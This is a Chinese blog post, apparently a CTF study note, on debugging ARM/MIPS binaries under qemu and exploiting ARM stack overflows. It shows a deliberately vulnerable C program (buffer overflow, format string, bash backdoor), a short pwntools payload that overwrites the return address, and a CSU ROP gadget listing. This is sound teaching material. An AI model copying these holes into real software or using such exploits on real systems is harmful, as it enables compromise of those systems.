<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前言       记录一下异构的PWN题 🔺qemu 的 user 模式下，所以即便程序重启 libc 地址也不变，但是system模式，即加了内核的情况下就会改变了。                     一、调试问题                           1.ARM架构       pwndbg对arm架构的支持还是挺好的">
<meta property="og:type" content="article">
<meta property="og:title" content="Arm从0开始">
<meta property="og:url" content="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="前言       记录一下异构的PWN题 🔺qemu 的 user 模式下，所以即便程序重启 libc 地址也不变，但是system模式，即加了内核的情况下就会改变了。                     一、调试问题                           1.ARM架构       pwndbg对arm架构的支持还是挺好的">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220032.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106220242.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211106221534.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150231733.png">
<meta property="og:image" content="https://dev.azure.com/zslyvain/9285f0e6-8055-4a5c-aec3-50d9555ac078/_apis/git/repositories/4eb461c6-bb1f-489f-978b-686e8c32decf/items?path=/1625856577691_8905.png&versionDescriptor%5BversionOptions%5D=0&versionDescriptor%5BversionType%5D=0&versionDescriptor%5Bversion%5D=master&resolveLfs=true&$format=octetStream&api-version=5.0">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20211230150255746.png">
<meta property="article:published_time" content="2021-11-02T02:25:33.000Z">
<meta property="article:modified_time" content="2023-09-08T08:12:37.783Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="异构">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png"><title>Arm从0开始 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Arm从0开始</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-08</span></span></div></header><div class="post-body">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p>记录一下异构的PWN题</p>
<p>🔺qemu 的 user 模式下，所以即便程序重启 libc 地址也不变，但是system模式，即加了内核的情况下就会改变了。</p>

        <h1 id="一、调试问题"   >
          <a href="#一、调试问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试问题" class="headerlink" title="一、调试问题"></a>一、调试问题</h1>
      
        <h2 id="1-ARM架构"   >
          <a href="#1-ARM架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ARM架构" class="headerlink" title="1.ARM架构"></a>1.ARM架构</h2>
      <p><code>pwndbg</code>对arm架构的支持还是挺好的</p>

        <h3 id="1-无PIE"   >
          <a href="#1-无PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-无PIE" class="headerlink" title="(1)无PIE"></a>(1)无PIE</h3>
      <p>没有PIE的时候，直接使用patchelf将其链接器和搜索路径改一下即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>然后通过qemu加载运行库启动</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>之后通过gdb-multiarch连接上即可</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q armNote</span><br><span class="line">target remote: 12345</span><br></pre></td></tr></table></div></figure>

<p>这样就能调试了，包括pwndbg中的堆块heap，bins命令等也可以使用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png" alt="image-20211121161707292"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png" alt="image-20211121161725233"></p>

        <h3 id="2-有PIE"   >
          <a href="#2-有PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-有PIE" class="headerlink" title="(2)有PIE"></a>(2)有PIE</h3>
      <p>这个就比较复杂了，首先还是改掉用链接器和搜索路径，之后运行起来，查看vmmap</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png" alt="image-20211121162647509"></p>
<p>这里在stack的末尾，即图中蓝色框起来的就是elf基地址，我也不知道为什么，反正调试就是这样的，可能是QEMU和PIE的相关机制问题把。</p>
<p>之后通过elfBase来断点，再通过got表即可找到libc基地址了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png" alt="image-20211121163058346"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png" alt="image-20211121163230165"></p>
<p>之后再通过<code>add-symbol-file</code>即可得到地址了，地址由于qemu的关系，一直是不变的。</p>
<p>但是这里如果直接打印地址会出错，原因未知，需要重载符号表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png" alt="image-20211121163909059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png" alt="image-20211121164400425"></p>
<p>重载符号表如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png" alt="image-20211121164500582"></p>
<p>可以看到之后就正确了。</p>
<p>不过还是没有办法进行bins，heap之类的命令。这个命令是pwndbg从<code>__libc_malloc_initialized</code>这个全局符号获取的，但是添加了符号表之后这个全局符号还是没有被重新加载</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png" alt="image-20211121165405192"></p>
<p>导致无法识别，所以也就无法使用堆相关命令，不过可以从main_aren中简单看一下堆结构</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png" alt="image-20211121170328689"></p>

        <h2 id="2-MIPS架构"   >
          <a href="#2-MIPS架构" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-MIPS架构" class="headerlink" title="2.MIPS架构"></a>2.MIPS架构</h2>
      
        <h3 id="1-无PIE-1"   >
          <a href="#1-无PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-无PIE-1" class="headerlink" title="(1)无PIE"></a>(1)无PIE</h3>
      <p>可以直接进行相应运行库加载即可，但是最好还是用gef插件。</p>

        <h3 id="2-有PIE-1"   >
          <a href="#2-有PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-有PIE-1" class="headerlink" title="(2)有PIE"></a>(2)有PIE</h3>
      <p>pwndbg对mips架构的支持不太好，但是也由于gef关于qemu的vmmap命令不太准确，所以这里可以借助pwndbg的vmmap命令获取，如同之前的arm架构一样，获取到elf基地址之后即可查看对应的libc地址。</p>

        <h2 id="项目："   >
          <a href="#项目：" class="heading-link"><i class="fas fa-link"></i></a><a href="#项目：" class="headerlink" title="项目："></a>项目：</h2>
      <p>或者看项目，这个可以一键获取对应版本的glibc，在gdb调试中自动解析符号表和地址，方便做异构的pwn题。</p>
<p><code>mulArchAll</code>:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/mulArchAll.git" >https://github.com/PIG-007/mulArchAll.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="二、ARM"   >
          <a href="#二、ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、ARM" class="headerlink" title="二、ARM"></a>二、ARM</h1>
      
        <h2 id="1-寄存器关系"   >
          <a href="#1-寄存器关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-寄存器关系" class="headerlink" title="1.寄存器关系"></a>1.寄存器关系</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png" alt="32"></p>
<ul>
<li><p>R0<del>R3：函数调用参数，代表第0</del>4个参数，剩下的参数从右向左依次入栈，函数返回值保存在R0中。(对应在aarch64中为R0<del>R7，但是gdb调试或者IDA中一般显示X0</del>X30，同时还有低32位的W0~W30)</p>
</li>
<li><p>SP：类似rsp,esp，栈指针</p>
</li>
<li><p>FP：类似ebp，栈指针</p>
</li>
<li><p>LR：当发生函数调用时，会保存调用函数处的地址，退出函数时赋值给PC。</p>
</li>
<li><p>PC：类似eip,rip，存储下一条指令的地址。</p>
</li>
<li><p>R11：类似ebp，栈指针，其实就差不多是FP</p>
</li>
</ul>

        <h2 id="2-汇编指令"   >
          <a href="#2-汇编指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-汇编指令" class="headerlink" title="2.汇编指令"></a>2.汇编指令</h2>
      
        <h3 id="1-寄存器传送MOV"   >
          <a href="#1-寄存器传送MOV" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-寄存器传送MOV" class="headerlink" title="(1)寄存器传送MOV"></a>(1)寄存器传送MOV</h3>
      <p>寄存器之间还是MOV指令，比如MOV R2,R0;但是如果涉及到内存上的，则需要先加载到寄存器中，或者把寄存器中的值存储到内存中</p>

        <h3 id="2-寄存器-内存传送"   >
          <a href="#2-寄存器-内存传送" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-寄存器-内存传送" class="headerlink" title="(2)寄存器-内存传送"></a>(2)寄存器-内存传送</h3>
      <p>STR(store reg)/LDR(load reg)以及STM(store multiple)/LDM(load multiple)</p>

        <h4 id="①STR-LDR模式"   >
          <a href="#①STR-LDR模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#①STR-LDR模式" class="headerlink" title="①STR/LDR模式"></a>①STR/LDR模式</h4>
      
        <h5 id="STR-Ra-Rb-："   >
          <a href="#STR-Ra-Rb-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#STR-Ra-Rb-：" class="headerlink" title="STR Ra [Rb]："></a>STR Ra [Rb]：</h5>
      <p>Ra中的数据存储到Rb指向的内存中</p>

        <h5 id="LDR-Ra-Rb"   >
          <a href="#LDR-Ra-Rb" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDR-Ra-Rb" class="headerlink" title="LDR Ra [Rb]"></a>LDR Ra [Rb]</h5>
      <p>Rb指向的内存中的值加载到Ra中</p>
<p>此外还有如下情形</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR  R0,[R1, #12]  // R0 --&gt; [R1+12]</span><br><span class="line">LDR  R4,[R5, R6]  // R4 &lt;-- [R5+R6]</span><br></pre></td></tr></table></div></figure>




        <h4 id="②STM-LDM模式"   >
          <a href="#②STM-LDM模式" class="heading-link"><i class="fas fa-link"></i></a><a href="#②STM-LDM模式" class="headerlink" title="②STM/LDM模式"></a>②STM/LDM模式</h4>
      
        <h5 id="STM-R0-R4-R5"   >
          <a href="#STM-R0-R4-R5" class="heading-link"><i class="fas fa-link"></i></a><a href="#STM-R0-R4-R5" class="headerlink" title="STM R0, {R4,R5}"></a>STM R0, {R4,R5}</h5>
      <p>R4的值传送给R0+x对应的内存单元，然后R5的值传给R0+x+x对应的内存单元</p>
<p>这个x即由后缀决定，分别有以下几种</p>
<ul>
<li><p>DB(Decrease Before)：每次传送前R0加上x，x为负数</p>
</li>
<li><p>DA(Decrease After)：每次传送后R0加上x，x为负数</p>
</li>
<li><p>IB(Increase Before)：每次传送前R0加上x，x为正数</p>
</li>
<li><p>IA(Increase After)：每次传送后R0加上x，x为正数</p>
</li>
</ul>
<p>而X则在不同的CPU位数下不同，32为4，64则为8。</p>
<p>此外堆栈的增长方向可以不同，也可以在不同情形下作为后缀，效果一样的</p>
<ul>
<li>FD(Full Descent)：满递减堆栈</li>
<li>FA(Full Ascent)：满递增堆栈</li>
<li>ED(Empty Descent)：空递减堆栈</li>
<li>EA(Empty Ascent)：空递增堆栈</li>
</ul>
<p>满则代表栈指针指向栈顶，空则代表栈指针不指向栈顶</p>

        <h3 id="3-跳转指令"   >
          <a href="#3-跳转指令" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-跳转指令" class="headerlink" title="(3)跳转指令"></a>(3)跳转指令</h3>
      
        <h4 id="①分支跳转-Branch"   >
          <a href="#①分支跳转-Branch" class="heading-link"><i class="fas fa-link"></i></a><a href="#①分支跳转-Branch" class="headerlink" title="①分支跳转(Branch)"></a>①分支跳转(Branch)</h4>
      
        <h5 id="B"   >
          <a href="#B" class="heading-link"><i class="fas fa-link"></i></a><a href="#B" class="headerlink" title="B"></a>B</h5>
      <p>无条件跳转</p>

        <h5 id="BX-lt-Rm-gt"   >
          <a href="#BX-lt-Rm-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#BX-lt-Rm-gt" class="headerlink" title="BX &lt;Rm&gt;"></a>BX &lt;Rm&gt;</h5>
      <p>由寄存器给出地址</p>
<p>若 Rm 的 bit[0] 为1，切换到 Thumb 指令执行；</p>
<p>若 Rm 的 bit[0] 为0，切换到 ARM 指令执行。</p>

        <h5 id="BL"   >
          <a href="#BL" class="heading-link"><i class="fas fa-link"></i></a><a href="#BL" class="headerlink" title="BL"></a>BL</h5>
      <p>类似于Call，会存入返回地址到LR寄存器</p>

        <h5 id="BLX-BLR"   >
          <a href="#BLX-BLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLX-BLR" class="headerlink" title="BLX/BLR"></a>BLX/BLR</h5>
      <p>即类似对应组合</p>

        <h4 id="②条件跳转"   >
          <a href="#②条件跳转" class="heading-link"><i class="fas fa-link"></i></a><a href="#②条件跳转" class="headerlink" title="②条件跳转"></a>②条件跳转</h4>
      <p>依据CPSR寄存器下的ALU状态标志位</p>
<p>CPSR寄存器包含下面的ALU状态标志：</p>
<p>　　N　 Set when the result of the operation was Negative(结果为负数)</p>
<p>　　Z    Set when the result of the operation was Zero(结果为0)</p>
<p>　　C    Set when the operation result in a Carry(发生进位，或借位)</p>
<p>　　V    Set when the operation caused oVerflow(操作造成溢出)</p>
<p>　　Q    ARM architecture v5E only sticky flag</p>
<p>还有BEQ、BNE</p>

        <h2 id="2-非叶子函数溢出"   >
          <a href="#2-非叶子函数溢出" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-非叶子函数溢出" class="headerlink" title="2.非叶子函数溢出"></a>2.非叶子函数溢出</h2>
      
        <h3 id="1-栈模型"   >
          <a href="#1-栈模型" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-栈模型" class="headerlink" title="(1)栈模型"></a>(1)栈模型</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">| 	Last FP   | </span><br><span class="line">+-------------+</span><br><span class="line">| return_addr |&lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>先压入LR，再压入FP，当前的FP指针指向的内容为LR保存的返回地址</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png" alt="image-20211103144720968"></p>

        <h3 id="2-题目："   >
          <a href="#2-题目：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-题目：" class="headerlink" title="(2)题目："></a>(2)题目：</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    myFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-利用："   >
          <a href="#3-利用：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-利用：" class="headerlink" title="(3)利用："></a>(3)利用：</h3>
      <p>一般而言都是不存在PIE的</p>

        <h4 id="A-后门"   >
          <a href="#A-后门" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-后门" class="headerlink" title="A.后门"></a>A.后门</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">backDoor = <span class="number">0x1050C</span></span><br><span class="line"></span><br><span class="line">fake_FP = <span class="number">0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(backDoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h4 id="B-ROP链条"   >
          <a href="#B-ROP链条" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-ROP链条" class="headerlink" title="B.ROP链条"></a>B.ROP链条</h4>
      
        <h5 id="🔺注意："   >
          <a href="#🔺注意：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注意：" class="headerlink" title="🔺注意："></a>🔺注意：</h5>
      <p>不知道为啥，在我的GDB调试时，打印出来的函数地址和真实的函数地址不一样：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png" alt="image-20211104115041178"></p>
<p>上面0x2101c是system的got表地址，可是和GDB打印的函数地址不一样，但是实际上libc.so文件没什么问题，因为可以正常getshell。之后咨询了lucky师傅之后，在室友的帮助下，编译了各个版本的arm架构下的glibc，再通过qemu加载运行库就正常了。</p>

        <h5 id="劫持栈模型："   >
          <a href="#劫持栈模型：" class="heading-link"><i class="fas fa-link"></i></a><a href="#劫持栈模型：" class="headerlink" title="劫持栈模型："></a>劫持栈模型：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | </span><br><span class="line">+-------------+</span><br><span class="line">|gadgets_addr | &lt;- frame pointer(return_addr)</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-溢出字节不受限制"   >
          <a href="#A-溢出字节不受限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-溢出字节不受限制" class="headerlink" title="A.溢出字节不受限制"></a>A.溢出字节不受限制</h5>
      
        <h6 id="a-存在pop-r0-pc"   >
          <a href="#a-存在pop-r0-pc" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-存在pop-r0-pc" class="headerlink" title="a.存在pop {r0,*, pc}"></a>a.存在<code>pop &#123;r0,*, pc&#125;</code></h6>
      <p>当有<code>pop &#123;r0,*, pc&#125;</code>这种gadget，当然就是想怎么用就怎么用，但没有的时候可以用常见的CSU来替代。</p>

        <h6 id="b-利用csu"   >
          <a href="#b-利用csu" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-利用csu" class="headerlink" title="b.利用csu"></a>b.利用csu</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">.text:0001049C                 LDR     R3, [R5],#4                 ②</span><br><span class="line">.text:000104A0                 MOV     R2, R9</span><br><span class="line">.text:000104A4                 MOV     R1, R8</span><br><span class="line">.text:000104A8                 MOV     R0, R7</span><br><span class="line">.text:000104AC                 BLX     R3                          ③</span><br><span class="line">.text:000104B0                 CMP     R6, R4</span><br><span class="line">.text:000104B4                 BNE     loc_10498</span><br><span class="line">.text:000104B8                 LDMFD   SP!, &#123;R4-R10,PC&#125;            ①</span><br></pre></td></tr></table></div></figure>

<p>这里就是很正常的，通过①来为R4-R10赋值，以及控制PC跳转到②，再利用R5地址对应的值来赋值给R3对应跳转，期间也可通过R7-R8来控制R0-R2的参数。这里需要满足R5处保存的是got表地址，即将R5赋值为func_got_addr即可。</p>
